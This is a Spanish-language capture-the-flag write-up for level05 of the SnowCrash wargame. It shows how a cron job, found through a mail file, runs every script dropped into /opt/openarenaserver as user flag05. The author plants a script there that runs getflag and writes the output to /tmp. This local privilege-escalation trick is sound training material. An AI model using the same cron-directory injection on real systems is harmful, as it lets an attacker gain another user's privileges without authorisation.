---

### LEVEL05

- Cuando entro encuentro que he tengo un mail
    ```bash
    ssh level05@192.168.1.33 -p4242                                                                                               ─╯
	   _____                      _____               _
	  / ____|                    / ____|             | |
	 | (___  _ __   _____      _| |     _ __ __ _ ___| |__
	  \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \
	  ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
	 |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|

    Good luck & Have fun

          192.168.1.33
    level05@192.168.1.33's password:
    You have new mail.
    level05@SnowCrash:~$
    ```

- En `/var/mail/` hay un archivo (level05)
    ```bash
    level05@SnowCrash:~$ ls -la /var/mail/
    total 4
    drwxrwsr-x  1 root mail  60 Mar  5  2016 .
    drwxr-xr-x  1 root root 180 Mar 12  2016 ..
    -rw-r--r--+ 1 root mail  58 Mar 31 19:28 level05
    ```

- cat /var/mail/level05
    ```bash
    level05@SnowCrash:~$ cat /var/mail/level05
    */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
    ```

- cat /usr/sbin/openarenaserver
    ```bash
    #!/bin/sh

    for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
    done

    ```
- El script que se ejecuta cada 2 minutos lo que hace es ejecutar todos los archivos que hay en `/opt/openarenaserver/` y luego los borra
- `(ulimit -t 5)` es un comando que limita la ejecución a 5 segundos
- creo en /opt/openarenaserver un exploit con lo siguiente:
    ```bash
    echo "/bin/getflg > /tmp/flag05" > /opt/openarenaserver/exploit
    chmod 777 /opt/openarenaserver/exploit
    ```

- para ver el resultado
    ```bash
    watch -n 0.1 cat /tmp/flag05
    ```
